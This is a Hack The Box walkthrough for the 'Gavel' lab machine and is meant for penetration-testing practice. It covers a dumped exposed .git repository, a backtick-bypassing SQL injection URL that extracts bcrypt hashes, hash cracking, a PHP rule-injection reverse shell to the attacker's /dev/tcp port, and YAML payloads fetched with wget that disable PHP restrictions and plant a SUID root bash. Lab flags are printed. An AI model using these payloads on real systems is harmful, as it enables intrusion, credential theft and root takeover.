# Gavel - HTB Walkthrough

## Machine Information
- **Name:** Gavel
- **IP:** 10.129.242.203
- **Difficulty:** Medium
- **OS:** Linux (Ubuntu)
- **Attacker IP:** 10.10.16.14

---

## Table of Contents
1. [Initial Enumeration](#initial-enumeration)
2. [Git Repository Discovery](#git-repository-discovery)
3. [SQL Injection Exploitation](#sql-injection-exploitation)
4. [Hash Cracking](#hash-cracking)
5. [RCE via Admin Panel](#rce-via-admin-panel)
6. [Privilege Escalation to Auctioneer](#privilege-escalation-to-auctioneer)
7. [Privilege Escalation to Root](#privilege-escalation-to-root)
8. [Attack Chain Summary](#attack-chain-summary)

---

## Initial Enumeration

### Step 1: Port Scanning with Nmap

**Why?** We need to discover what services are running on the target machine to identify potential attack vectors.

**Command:**
```bash
nmap -p- --min-rate=10000 -T5 -sCV -Pn 10.129.242.203 -oN nmap_scan.txt
```

**Flags Explained:**
- `-p-`: Scan ALL 65,535 TCP ports
- `--min-rate=10000`: Send at least 10,000 packets per second
- `-T5`: Aggressive timing (fastest)
- `-sCV`: Service/version detection + default scripts
- `-Pn`: Skip ping (assume host is up)
- `-oN`: Output to file

**Output:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://gavel.htb/
```

**Analysis:**
- SSH on port 22 (requires credentials)
- HTTP on port 80 (redirects to `gavel.htb`)

### Step 2: Add Domain to /etc/hosts

**Why?** The web server redirects to `gavel.htb`, so we need DNS resolution.

**Command:**
```bash
echo "10.129.242.203 gavel.htb" | sudo tee -a /etc/hosts
```

### Step 3: Web Directory Enumeration

**Why?** Discover hidden directories and files that might not be linked from the main page.

**Command:**
```bash
feroxbuster -u http://gavel.htb -w /usr/share/wordlists/dirb/common.txt -o feroxbuster_scan.txt
```

**Key Findings:**
- `/admin.php` - Admin panel
- `/login.php` - Login page
- `/register.php` - Registration
- `/inventory.php` - User inventory
- `/bidding.php` - Auction page
- **`/.git/` - EXPOSED GIT REPOSITORY!** 🚨

---

## Git Repository Discovery

### What is an Exposed Git Repository?

**Why This Matters:** When a `.git/` directory is accessible via HTTP, attackers can download the entire source code, commit history, and potentially find credentials or vulnerabilities.

### Downloading the Repository

**Command:**
```bash
mkdir git_repo
git-dumper http://gavel.htb/.git/ git_repo
```

**What This Does:**
- Recursively downloads all Git objects
- Reconstructs the complete repository locally
- Gives us access to full source code

**Result:** 1849 files extracted!

### Source Code Analysis

**Key Files Found:**
```bash
cd git_repo
ls -la
```

**Important Files:**
- `admin.php` - Admin panel code
- `includes/bid_handler.php` - **Contains RCE vulnerability!**
- `includes/config.php` - Database credentials (`gavel:gavel`)
- `inventory.php` - **Contains SQL injection!**

---

## SQL Injection Exploitation

### Finding the Vulnerability

**In `inventory.php` source code:**

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";

$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

**Vulnerability:** The `$col` variable is inserted DIRECTLY into the SQL query before it's prepared. Only backticks are filtered!

### Understanding the Attack

**Why Standard SQLi Doesn't Work:**
- The injection point is wrapped in backticks: `` SELECT `$col` FROM ... ``
- We need a nested subquery approach

### The Working Payload

**URL to visit in browser:**
```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`'x`+FROM+users)y;--+-&sort=?;--+-
```

**How It Works:**
1. Closes the backtick with `` x` ``
2. Injects `FROM (SELECT ...)y` to create a derived table
3. Uses `group_concat()` to concatenate usernames and passwords
4. Creates alias `` `'x` `` (backtick + quote + x + backtick)
5. Comments out the rest

**Result in the page:**
```html
<strong>auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS</strong>
```

---

## Hash Cracking

### Identifying the Hash

**Format:** `$2y$10$...` = **bcrypt** hashing

**Why Bcrypt?**
- Modern, slow hashing algorithm
- Includes salt
- Designed to resist brute force

### Cracking the Hash

**Command:**
```bash
echo 'auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Output:**
```
midnight1        (auctioneer)
```

**Credentials:** `auctioneer:midnight1` ✅

---

## RCE via Admin Panel

### Logging in as Auctioneer

1. Visit `http://gavel.htb/login.php`
2. Login with `auctioneer:midnight1`
3. Navigate to `http://gavel.htb/admin.php`

### Understanding the RCE Vulnerability

**From `bid_handler.php` source:**

```php
$rule = $auction['rule'];
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

**Vulnerability:**
- `runkit_function_add()` creates a PHP function dynamically
- The `$rule` parameter becomes the function body
- We control `$rule` through the admin panel!
- **Arbitrary PHP code execution!**

### Exploitation

**Step 1: Start Netcat Listener**
```bash
nc -lvnp 4444
```

**Step 2: Modify Auction Rule**

In admin panel, change any auction's **Rule** field to:
```php
system('bash -c "bash -i >& /dev/tcp/10.10.16.14/4444 0>&1"'); return true;
```

**Step 3: Trigger the RCE**

1. Go to `/bidding.php`
2. Place a bid on the modified auction
3. Shell connects to your listener!

**Result:**
```bash
www-data@gavel:/var/www/html/gavel/includes$
```

---

## Privilege Escalation to Auctioneer

### Stabilizing the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

### Switching User

**Why?** We have the password from earlier!

```bash
su - auctioneer
# Password: midnight1
```

**Success!**
```bash
auctioneer@gavel:~$ cat user.txt
d783bbb4b36ed0b382a54a70c0be1c23
```

**User Flag:** `d783bbb4b36ed0b382a54a70c0be1c23` 🚩

---

## Privilege Escalation to Root

### Enumeration as Auctioneer

**Check groups:**
```bash
id
```
Output: `uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)`

**Interesting:** We're in the `gavel-seller` group!

**Find files owned by this group:**
```bash
find / -group gavel-seller 2>/dev/null
```

Output:
```
/run/gaveld.sock
/usr/local/bin/gavel-util
```

### Analyzing gavel-util

```bash
/usr/local/bin/gavel-util
```

Output:
```
Usage: /usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

**This submits YAML files to the `gaveld` daemon running as root!**

### Checking sample.yaml

```bash
cat /opt/gavel/sample.yaml
```

```yaml
---
item:
  name: "Dragon's Feathered Hat"
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```

**Notice:** The `rule` field contains PHP code!

### PHP Restrictions

```bash
cat /opt/gavel/.config/php/php.ini
```

```ini
open_basedir=/opt/gavel
disable_functions=exec,shell_exec,system,passthru,...
```

**Strategy:** 
1. Remove PHP restrictions
2. Create SUID bash

### Step 1: Remove PHP Restrictions

**Create on Kali:**
```bash
cat > fix_ini.yaml << 'EOF'
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
EOF

python3 -m http.server 8000
```

**On target:**
```bash
cd /tmp
wget http://10.10.16.14:8000/fix_ini.yaml
/usr/local/bin/gavel-util submit fix_ini.yaml
sleep 3
cat /opt/gavel/.config/php/php.ini
```

**Verify:** `open_basedir=` and `disable_functions=` should be empty!

### Step 2: Create SUID Bash

**Create on Kali:**
```bash
cat > final_exploit.yaml << 'EOF'
name: rootshell
description: suid bash
image: "x.png"
price: 1
rule_msg: "rooting"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOF
```

**On target:**
```bash
wget http://10.10.16.14:8000/final_exploit.yaml
/usr/local/bin/gavel-util submit final_exploit.yaml
sleep 3
ls -la /opt/gavel/rootbash
```

### Step 3: Execute SUID Bash

```bash
/opt/gavel/rootbash -p
```

**Important:** The `-p` flag preserves SUID privileges!

**Result:**
```bash
rootbash-5.1# id
uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root)
```

**Root Flag:**
```bash
cat /root/root.txt
3dfbd871c3305ad6264a7ae12ea15c38
```

**Root Flag:** `3dfbd871c3305ad6264a7ae12ea15c38` 🚩

---

## Attack Chain Summary

```
1. Nmap Scan → Found HTTP (80) + SSH (22)
           ↓
2. Feroxbuster → Discovered /.git/ exposed
           ↓
3. git-dumper → Downloaded source code
           ↓
4. Source Analysis → Found SQL injection in inventory.php
           ↓
5. SQL Injection → Extracted auctioneer password hash
           ↓
6. John the Ripper → Cracked hash: auctioneer:midnight1
           ↓
7. Admin Login → Access to admin panel
           ↓
8. PHP RCE → Modified auction rule with reverse shell
           ↓
9. Trigger RCE → Got shell as www-data
           ↓
10. su auctioneer → Switched user with password
           ↓
11. Found gavel-util → YAML submission to root daemon
           ↓
12. Disable PHP Restrictions → Modified php.ini via YAML
           ↓
13. Create SUID Bash → system() call via YAML
           ↓
14. Execute SUID → Got root!
           ↓
15. ROOT FLAG! 🎉
```

---

## Key Vulnerabilities

1. **Exposed Git Repository** - Full source code disclosure
2. **SQL Injection** - Complex nested subquery exploitation
3. **PHP Code Injection** - Dynamic function creation with user input
4. **Weak Password** - Easily crackable with wordlist
5. **Privilege Separation Failure** - Config file modifiable by application
6. **SUID Exploitation** - Root daemon executing user-controlled PHP

---

## Flags

| Flag | Hash |
|------|------|
| User | `d783bbb4b36ed0b382a54a70c0be1c23` |
| Root | `3dfbd871c3305ad6264a7ae12ea15c38` |

---

## Tools Used

- **Nmap** - Port scanning
- **Feroxbuster** - Directory enumeration
- **git-dumper** - Git repository extraction
- **John the Ripper** - Password cracking
- **Netcat** - Reverse shell listener
- **Python HTTP Server** - File transfer

---

**Date:** January 27, 2026  
**Difficulty:** Medium  
**Creator:** HackTheBox Team
